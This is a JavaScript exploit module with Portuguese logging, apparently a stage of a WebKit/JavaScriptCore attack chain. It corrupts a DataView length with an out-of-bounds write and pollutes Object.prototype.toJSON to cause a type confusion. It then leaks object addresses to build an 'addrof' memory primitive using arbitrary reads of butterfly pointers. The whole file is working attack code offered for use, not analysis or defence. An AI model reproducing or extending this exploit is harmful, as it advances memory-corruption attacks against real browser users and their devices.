// js/script3/UltimateExploit.mjs (v101.1 - Nome da Função Exportada Corrigido)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    arb_read,
    arb_write,
    oob_write_absolute,
    attemptAddrofUsingCoreHeisenbug
} from '../core_exploit.mjs';
import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs';

export const FNAME_MODULE_ULTIMATE = "Exploit_Final_R61_Uncaged_TC_Leak";

let g_primitives = {
    initialized: false,
    addrof: null,
    fakeobj: null,
};

const TC_TRIGGER_DV_METADATA_BASE = 0x58;
const TC_TRIGGER_DV_M_LENGTH_OFFSET = TC_TRIGGER_DV_METADATA_BASE + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
const BUTTERFLY_OFFSET = new AdvancedInt64(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET);

function isValidPointer(ptr) {
    if (!ptr || !isAdvancedInt64Object(ptr)) return false;
    if (ptr.high() === 0 && ptr.low() < 0x10000) return false;
    return true;
}

async function bootstrap_via_uncaged_tc(object_to_plant, array_to_inspect) {
    logS3("[Bootstrap] Iniciando vazamento inicial com TC em Array 'uncaged'...", "info");
    
    let probe_result = { tc_triggered: false, this_type: null };

    function toJSON_PlantingProbe() {
        probe_result.tc_triggered = true;
        probe_result.this_type = Object.prototype.toString.call(this);
        if (probe_result.this_type === "[object Array]") {
            this.leaked_prop = object_to_plant;
        }
    }
    
    const ppKey = 'toJSON';
    let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
    let polluted = false;
    
    try {
        Object.defineProperty(Object.prototype, ppKey, { value: toJSON_PlantingProbe, writable: true, configurable: true });
        polluted = true;
        oob_write_absolute(TC_TRIGGER_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4); 
        await PAUSE_S3(50);
        JSON.stringify(array_to_inspect);
    } finally {
        if (polluted) {
            if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey];
        }
    }

    if (probe_result.this_type !== "[object Array]") {
        throw new Error(`Falha na hipótese da TC. Tipo observado: ${probe_result.this_type}`);
    }
    
    if (array_to_inspect.leaked_prop !== object_to_plant) {
        throw new Error("TC em Array ocorreu, mas a propriedade plantada não pôde ser verificada diretamente.");
    }

    logS3("[Bootstrap] SUCESSO! Type Confusion em Array 'uncaged' e plantio de propriedade verificados!", "vuln");
    
    const leak_attempt = await attemptAddrofUsingCoreHeisenbug(array_to_inspect);
    if (!leak_attempt.success) {
        throw new Error("A primitiva addrof (Heisenbug) falhou em obter o endereço do array vítima.");
    }
    
    const victim_array_addr = new AdvancedInt64(leak_attempt.leaked_address_as_int64);
    logS3(`Endereço do tc_victim_array (via Heisenbug Addrof): ${victim_array_addr.toString(true)}`, "leak");

    const butterfly_addr = await arb_read(victim_array_addr.add(BUTTERFLY_OFFSET), 8);
    if (!isValidPointer(butterfly_addr)) {
        throw new Error("Não foi possível ler um ponteiro butterfly válido do array vítima.");
    }
    logS3(`Endereço do Butterfly: ${butterfly_addr.toString(true)}`, "leak");
    
    const pointer_offset_in_butterfly = (array_to_inspect.length - 1) * 8; 
    const leaked_address = await arb_read(butterfly_addr.add(pointer_offset_in_butterfly), 8);
    return leaked_address;
}

async function createRealPrimitives() {
    await triggerOOB_primitive({ force_reinit: true });
    
    const bootstrap_obj = { marker: 0x13371337 }; 
    const tc_victim_array = [1.1, 2.2, 3.3];

    const addrof_victim_addr = await bootstrap_via_uncaged_tc(bootstrap_obj, tc_victim_array);
    if (!isValidPointer(addrof_victim_addr)) {
        throw new Error("Falha ao obter o endereço de bootstrap inicial.");
    }
    logS3(`Endereço de bootstrap (addrof_victim_arr) obtido: ${addrof_victim_addr.toString(true)}`, 'good');

    let addrof_victim_arr = [{}];
    addrof_victim_arr[0] = bootstrap_obj;

    g_primitives.addrof = async (obj) => {
        addrof_victim_arr[0] = obj;
        let butterfly = await arb_read(addrof_victim_addr.add(BUTTERFLY_OFFSET), 8);
        return await arb_read(butterfly, 8);
    };

    g_primitives.initialized = true;
}

// --- Função Principal do Exploit (NOME CORRIGIDO) ---
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_TEST_BASE = FNAME_MODULE_ULTIMATE;
    logS3(`--- Iniciando ${FNAME_TEST_BASE}: Exploit Final (R61 Uncaged) ---`, "test");

    try {
        await createRealPrimitives();
        if (!g_primitives.initialized) throw new Error("Falha ao inicializar as primitivas.");
        
        logS3("FASE 1 - SUCESSO: Primitiva 'addrof' real inicializada!", "vuln");
        document.title = `${FNAME_TEST_BASE} - Primitives OK`;
        
        return { success: true, message: "Primitivas construídas com sucesso via Uncaged TC Leak." };

    } catch (e) {
        logS3(`ERRO CRÍTICO: ${e.message}`, "critical", FNAME_TEST_BASE);
        console.error(e);
        document.title = `${FNAME_TEST_BASE} - FAIL`;
        return { success: false, error: e.message };
    }
}
